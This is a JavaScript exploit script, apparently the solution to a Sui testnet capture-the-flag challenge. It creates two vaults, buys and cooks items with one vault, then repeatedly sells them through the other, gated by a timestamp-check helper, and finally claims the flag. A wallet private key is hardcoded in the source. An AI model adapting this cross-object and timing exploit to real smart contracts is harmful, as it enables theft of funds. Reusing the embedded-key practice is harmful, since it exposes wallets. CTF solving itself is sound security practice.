import { Transaction } from '@mysten/sui/transactions';
import { SuiClient, getFullnodeUrl } from '@mysten/sui/client';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import axios from 'axios';

const secretKey = 'suiprivkey1qqsqnl67wmxvme3sv34endnujtr8yp0638vekzt9k5ael07qnrgdu52dr9g';
const keypair = Ed25519Keypair.fromSecretKey(secretKey);
const publicKey = keypair.getPublicKey();
const address = publicKey.toSuiAddress();

const client = new SuiClient({ url: getFullnodeUrl('testnet') });

const CLOCK_ID = '0x6';
const PACKAGE_ID = '0xa2c6dbd8b23b5811d89ce8225549be8217a40d7bf046a0e65810aed42cb721f3';
const SOLVE_PACKAGE_ID = '0x65fb06b4e31f157388ef08831ee18266de8d5decfedd225cba04efc809ed17f4';

// const suiRpcUrl = 'https://fullnode.devnet.sui.io/';

// 🔄 helper: wait for object to be on-chain and readable
async function waitForObject(client, objectId, retries = 10, delay = 1000) {
    for (let i = 0; i < retries; i++) {
        try {
        const obj = await client.getObject({ id: objectId });
        if (obj.data) return;
        } catch (_) {}
        await new Promise((r) => setTimeout(r, delay));
    }
    throw new Error(`Object ${objectId} not found`);
}


console.log(`Wallet Address: ${address}`);
const balance = await client.getBalance({ owner: address });
console.log('Balance:', balance);

// tx1 create 2 vaults
const tx1 = new Transaction();
tx1.moveCall({ target: `${PACKAGE_ID}::vault::init_vault` });
tx1.moveCall({ target: `${PACKAGE_ID}::vault::init_vault` });

const result1 = await client.signAndExecuteTransaction({
    signer: keypair,
    transaction: tx1,
    requestType: 'WaitForEffectsCert',
    options: {
        showEffects: true,
        showObjectChanges: true,
    },
});
console.log('Tx1 result:', result1);

const [vault1, vault2] = result1.objectChanges?.filter(
    (change) => change.type === 'created' && change.objectType.includes('Vault')
).map(v => v.objectId);

console.log('vault1:', vault1);
console.log('vault2:', vault2);

await waitForObject(client, vault1);
await waitForObject(client, vault2);

// tx2 uses vault1 to buy 20 potatoes
const tx2 = new Transaction();
for (let i = 0; i < 20; i++) {
    tx2.moveCall({
        target: `${PACKAGE_ID}::potato::buy_potato`,
        arguments: [tx2.object(vault1)],
    });
}

const result2 = await client.signAndExecuteTransaction({
    signer: keypair,
    transaction: tx2,
    requestType: 'WaitForEffectsCert',
    options: {
        showEffects: true,
        showObjectChanges: true,
    },
});

const potatoIds = result2.objectChanges?.filter(
    (change) => change.type === 'created' && change.objectType.includes('Potato')
).map(change => change.objectId);

console.log('Potato IDs:', potatoIds);

for (const id of potatoIds) {
    await waitForObject(client, id);
}

// tx3 uses vault1 to cooks all potatoes
const tx3 = new Transaction();
for (const potatoId of potatoIds) {
    tx3.moveCall({
        target: `${PACKAGE_ID}::potato::cook_potato`,
        arguments: [tx3.object(vault1), tx3.object(potatoId)],
    });    
}
const result3 = await client.signAndExecuteTransaction({
    signer: keypair,
    transaction: tx3,
    requestType: 'WaitForEffectsCert',
    options: {
        showEffects: true,
        showObjectChanges: true,
    },
});

// tx4 uses vault2 to sell all potatoes with pre-check of timestamp
let success = false;
let attempt = 0;

while (!success) {
    attempt += 1;
    console.log(`Attempt #${attempt}...`);

    const tx4 = new Transaction();

    tx4.moveCall({
        target: `${SOLVE_PACKAGE_ID}::exploit_helper::check_timestamp`,
        arguments: [tx4.object(CLOCK_ID)],
    });

    for (const potatoId of potatoIds) {
        tx4.moveCall({
            target: `${PACKAGE_ID}::potato::sell_potato`,
            arguments: [
                tx4.object(CLOCK_ID),
                tx4.object(vault2),
                tx4.object(potatoId),
            ],
        });
    }

    try {
        const result4 = await client.signAndExecuteTransaction({
            signer: keypair,
            transaction: tx4,
            requestType: 'WaitForEffectsCert',
            options: {
                showEffects: true
            }
        });

        if (result4.effects.status.status === 'success') {
            console.log('✅ tx4 succeeded!', result4.digest);
            success = true;
        } else {
            console.error('❌ tx4 failed logically:', result4.effects.status);
        }
    } catch (error) {
        console.error('❌ tx4 failed:', error.message || error);
        await new Promise(r => setTimeout(r, 300)); // wait 300ms before retrying
    }
}

// tx4 get the flag with vault2
const tx5 = new Transaction();
tx5.moveCall({
    target: `${PACKAGE_ID}::vault::get_flag`,
    arguments: [tx5.object(vault2)],
});     
const result5 = await client.signAndExecuteTransaction({signer: keypair,transaction: tx5,});
console.log('Tx4 result:', result5);